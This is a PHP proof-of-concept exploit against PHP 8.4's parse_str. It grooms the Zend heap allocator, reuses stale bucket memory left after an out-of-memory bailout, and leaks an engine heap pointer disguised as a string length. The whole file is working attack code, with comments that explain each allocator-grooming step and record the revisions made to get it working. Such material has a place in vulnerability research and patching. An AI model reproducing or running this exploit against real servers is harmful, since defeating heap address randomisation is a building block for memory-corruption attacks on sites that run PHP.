<?php
// Leak an engine heap pointer via allocator reuse.
//
// Chain of empirically verified facts (php 8.4.26, apache -X, gdb):
//  F1  parse_str($body, $out) destroys the passed array (zend_try_array_init:
//      zend_new_array(0) + full destroy) but bucket memory is NOT zeroed.
//  F2  The huge-key insert that OOMs reserves bucket 255 (nNumUsed=256) and
//      leaves it with STALE bytes.
//  F3  With a pre-groomed 300-entry assoc of 23-char strings (56 B chunks),
//      the final arData (9216 B = hash-256) is recycled from the groom
//      array's intermediate hash-256 arData; bucket 255's stale zval is
//      [P][IS_STRING] where P = the freed value string of groom key k255.
//  F4  Free-list depth of P is ~45 (destroy frees values k0..k299 ascending,
//      the HashTable LAST => head = old-HT slot, P at depth 45), and bailout
//      cleanup consumes the list before shutdown runs - so shutdown-time
//      probes can never reach P.
//
// The request makes the reuse happen DURING parse_str.  The body carries
// 60 "Ai[j]=1" sub-array vars: each allocates exactly one HashTable
// (sizeof=56 B) - the only 56 B allocations between destroy and OOM.  They
// drain the free list from the head; sub-array #46 lands on P.  Bucket 255's
// stale zval then reads [HashTable*][IS_STRING], and in the shutdown reader
// strlen($val) returns *(u64*)(HT+16) = ht->arData  =>
//     ENGINE HEAP POINTER LEAKED AS A STRING LENGTH (no deref, no crash).

header('Content-Type: text/plain; charset=utf-8');

function wlog($s) {
    file_put_contents('/tmp/g.log', $s . "\n", FILE_APPEND | LOCK_EX);
}

$k  = isset($_GET['k'])  ? (int) $_GET['k']  : 255;
$n  = isset($_GET['n'])  ? (int) $_GET['n']  : 300;
$hb = isset($_GET['hb']) ? (int) $_GET['hb'] : 0;

$body = file_get_contents('php://input');

@unlink('/tmp/g.log');

if ($hb > 0) {
    @ini_set('memory_limit', $hb . '');
}

register_shutdown_function(function () use ($k) {
    $cnt  = 0;
    $hits = [];
    if (isset($GLOBALS['out']) && is_array($GLOBALS['out'])) {
        $out = $GLOBALS['out'];
        $cnt = count($out);
        $i   = 0;
        foreach ($out as $val) {
            if ($i >= 190) {
                $t = gettype($val);
                if ($t === 'string') {
                    /* stale zval: [chunk*][IS_STRING]; strlen = *(u64*)(p+16) */
                    $len = strlen($val);
                    $hex = bin2hex(substr($val, 0, 32));
                    $hits[] = sprintf('i=%d len=%d hex=%s', $i, $len, $hex);
                }
            }
            $i++;
        }
    }
    wlog("SHUTDOWN count=$cnt");
    foreach ($hits as $h) {
        wlog('STALE ' . $h);
    }
    wlog('DONE');
});

/* ---- pre-groom $out -------------------------------------------------- */
/* value string chunk = align8(32+len); len 23 -> 56 B = HashTable bin.
 * Growing to 300 entries passes through hash-256 (arData 9216 B); that
 * intermediate arData keeps stale zvals after the resize and is recycled
 * later as parse_str's final arData (F3). */
$out = [];
for ($i = 0; $i < $n; $i++) {
    $out['k' . $i] = str_repeat('C', 23);
}
/* rev 8: pin MULTIPLE value strings alive so that EVERY 56 B page run
 * (73 slots / 4 KB page) keeps at least one live reference.  A fully-freed
 * run is released by ZendMM (page map cleared) and its slots become
 * unreachable for reallocation - observed with a single pin, whose page
 * guess was off.  With pins every 40 indices, P's run is guaranteed to
 * survive, so P stays on the bin-6 free list (depth ~= 45: the HashTable is
 * freed last => head, then k299..k256, then P) and the 60 sub-array
 * HashTables drain down onto it. */
foreach ([0, 40, 80, 120, 160, 200, 240, 280, 299] as $pi) {
    $GLOBALS['keep' . $pi] = $out['k' . $pi];
}

/* no unsets (rev 6): destroy walks buckets k0..k299 ascending and frees the
 * HashTable last, giving the free-list layout F4.  No 56 B allocation may
 * happen between here and parse_str. */
parse_str($body, $out);
